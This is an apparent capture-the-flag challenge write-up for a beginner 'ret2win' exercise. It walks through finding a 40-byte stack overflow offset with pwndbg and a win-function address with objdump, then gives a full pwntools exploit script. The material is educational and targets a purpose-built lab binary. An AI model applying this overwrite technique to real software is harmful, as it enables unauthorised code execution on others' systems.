# Challenge Name
babyr2w

## Learning Objective
Extended from BOF. Learn to find and rewrite return address to another function

## Description 
We want to win! But... how to win?

## Difficulty:
Guided (easy)

## Guide
In the code, you can see that `win` function is never called. We want to call this function as it contains the flag.

If you recall your basic buffer overflow practice, we overflowed the **saved base pointer address** to cause a segmentation fault. This time on top of that, we want to overwrite the return address.

|buffer|
:-:
|saved base pointer of caller|
|return address of caller| 
|function arguments|


With what we know, we just need to add an address after we overflow. (since return address is after saved base pointer address)

We will perform a technique called **ret2win**. The idea is overflow and rewrite the **return address** on the stack to another function.

### What we need to do:
1. Find the exact offset before it overflows
2. Find return address of `win` address

### To find the offset needed:
1. Open program with pwndbg
```shell
$> gdb chall
```

2. Generate the cyclic pattern of 100 bytes. This cyclic sequence helps uses to identify what address or how many bytes we want to overwrite.
```shell
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaa...
```

3. Run the program and paste when prompted
```shell
pwndbg> run
``` 

You should be able to observe this in the registers:
```shell
 RBP  0x6161616161616165 ('eaaaaaaa')
 RSP  0x7fffffffdc48 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'
```

This is the offset needed to overflow:

```shell
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

### To find the win address:

Run this in your terminal:

```shell
$> objdump -d chall | grep win
0000000000400797 <win>:
```

Now we can put our solve script together!

### Final Solution

1. Import the library
```python
from pwn import *
```

2. Depending on whether you want to solve locally or remotely, add either of the following:
```python
# local solve
p = process("./chall")

# remote solve
p = remotes("IP", PORT)
```

3. Now we need to add our win address (`p64()` because of little-endianness)
```python
win = p64(0x400797)
```

4. Since we want to send 40 bytes of input + win address:
```python
payload = b'A' * 40
payload += win
```

5. Interact with the service
```python
p.interactive()
```

When we put all that together u should get this:
```python
from pwn import *

# local solve
# p = process("./chall")

# remote solve
p = remote("IP", PORT)

# address of win function
win = p64(0x400797)

# payload 
payload = b'A' * 40
payload += win

# send payload
p.sendline(payload)
p.interactive()
```

Run in your terminal to solve:
```shell
$> python3 script.py
```
## Solution
Refer to solve.py

## Hints
1. https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win

## Attached Files
- chall.c
- chall

## Resources
- https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win

## Flag
TBD